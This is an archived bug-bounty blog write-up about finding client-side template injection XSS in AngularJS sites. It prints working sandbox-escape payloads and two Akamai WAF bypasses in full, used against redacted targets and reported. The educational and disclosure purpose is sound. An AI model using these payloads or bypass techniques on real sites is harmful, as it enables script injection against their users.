---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-08-13_xss-via-angular-template-injection.md
original_filename: 2022-08-13_xss-via-angular-template-injection.md
title: XSS via Angular Template Injection
category: documents
detected_topics:
- xss
- sso
- command-injection
- api-security
tags:
- imported
- documents
- xss
- sso
- command-injection
- api-security
language: en
raw_sha256: 12be37cc17e59aa6c9389d15956f47bdec2fbdcb3c0993cfa85a399f5481c2f5
text_sha256: 761818487352ca5fe85c28eed8cc50187625fffb27d76f3e9f4efdcc0eb5df97
ingested_at: '2026-06-28T07:32:13Z'
sensitivity: unknown
redactions_applied: false
---

# XSS via Angular Template Injection

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-08-13_xss-via-angular-template-injection.md
- Source Type: markdown
- Detected Topics: xss, sso, command-injection, api-security
- Ingested At: 2026-06-28T07:32:13Z
- Redactions Applied: False
- Raw SHA256: `12be37cc17e59aa6c9389d15956f47bdec2fbdcb3c0993cfa85a399f5481c2f5`
- Text SHA256: `761818487352ca5fe85c28eed8cc50187625fffb27d76f3e9f4efdcc0eb5df97`


## Content

---
title: "XSS via Angular Template Injection"
page_title: "XSS via Angular Template Injection - Bergee's Stories on Bug Hunting"
url: "https://bergee.it/blog/xss-via-angular-template-injection/"
final_url: "https://bergee.it/blog/xss-via-angular-template-injection/"
authors: ["Bartłomiej Bergier (@_bergee_)"]
bugs: ["CSTI", "XSS", "WAF bypass"]
publication_date: "2022-08-13"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2314
---

# XSS via Angular Template Injection

Posted on [2022-08-132022-09-07](https://bergee.it/blog/xss-via-angular-template-injection/) by [bergee](https://bergee.it/blog/author/bergee/)

This time I have a story about several XSS bugs I found across several programs. This type of XSS is called CSTI XSS (Client Side Template Injection) which means that the attacker can inject the javascript code inside the template language used by the client side technology. The modern client-side frameworks such as Vue, React or Angular allows to use of templates to print the values of variables or evaluate expressions. For example, this piece of code will display 2 as {{1+1}} expression equals 2:

> <html>  
> <head>  
> <meta charset=”utf-8″>  
> <script src=”https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js”></script>  
> </head>  
> <body>  
> <div ng-app>{{1+1}}</div>  
> </body>  
> </html>

There is a possibility to execute javascript expressions inside the mustache tags. Angular has some protection called sandbox which restricts from evaluation of unsafe expressions. Some clever people found a way to bypass this protection. The payload used to that varies among different versions of angular. How to test for the template injections:

  1. Try {{7*7}} as a payload and see if you see 49 rendered somewhere
  2. If so, check the Angular version with [Wappalyzer](https://www.wappalyzer.com/) or look at the source code
  3. Choose the right payload for the version and try to pop an alert box
  4. When there is WAF in place, play with the payload to achieve the goal

Look for payloads here:

<https://gist.github.com/mccabe615/cc92daaf368c9f5e15eda371728083a3>

## **The first case – the simple one**

I checked with wappalyzer that the site uses Angular 1.5.x. Don’t remember the exact version now.  
There was a search box on the main site. I thought I tried CSTI payload but it would not work for sure. That’s the main site.  
I tried {{7*7}} – the famous CSTI payload I saw on the site:

“Search Results – 49”

It worked – now it’s time to try to run some js. I looked for the payload here:

<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md>

It was a payload for AngularJS 1.5.9 – 1.5.11 by Jan Horn. I modified it to show the actual domain name. So the final link was:

> https://redacted.com/search?searchterm={{c=%27%27.sub.call;b=%27%27.sub.bind;a=%27%27.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync(%22astNode=pop();astNode.type=%27UnaryExpression%27;astNode.operator=%27(window.X?void0:(window.X=true,alert(document.domain)))+%27;astNode.argument={type:%27Identifier%27,name:%27foo%27};%22);m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=%27%27.sub;$eval(%27a(b.c)%27);[].push.apply=a;}}

It worked :). I got reflected XSS.

Lesson learned – do not make any assumptions.

![](https://bergee.it/blog/wp-content/uploads/2022/08/angular_csti_redacted-1.png)

## **The second case – the AKAMAI WAF in place**

I found a reflected XSS bug on site https://www.redacted.com The js code execution is possible through angular template injection.  
The site used the Angular 1.6 framework. I looked for the payload here:

<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md>

The original payload for Angular 1.6 was:

> {{constructor.constructor(‘alert(document.domain)’)()}}

AKAMAI WAF blocked it. After about one hour of trials and errors I was able to bypass the WAF with:

> {{constructor.constructor(‘a=document;confirm(a.domain)’)()}}

The alert of happiness popped up :).

![](https://bergee.it/blog/wp-content/uploads/2022/08/angular_csti_redacted_2.png)

## **The third case – the stronger AKAMAI WAF in place**

On another site, I found another CSTI XSS via Agular 1.4.3. The AKAMAI WAF was in place. It took me some time to bypass that and this time something as simple as the second case did not work. The payload I created was injected into the context of the page and was like:

> x=1}}};alert(1)//

I could not place it just like that as it was blocked by WAF. I used [**String.fromCodePoint()**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCodePoint) method which returns a string created by using the specified sequence of code points – in this case, ASCII codes. No brackets also triggered the WAF, eventually this payload worked. However, I could not execute alert(document.domain) as the code crashed :(. Reported this anyway

> {{([].toString()).constructor.prototype.charAt=[].join;$eval(([].toString()).constructor.fromCodePoint([120],[61],[49],[125],[125],[125],[59],[97],[108],[101],[114],[116],[40],[49],[41],[47],[47]));}}

where 120,61,49 and so on were ASCII codes of the chars used in payload.

![](https://bergee.it/blog/wp-content/uploads/2022/08/angular_csti_redacted-1024x388.png)

Reward: 👕

Hope you learned something. See you next bug 🙂
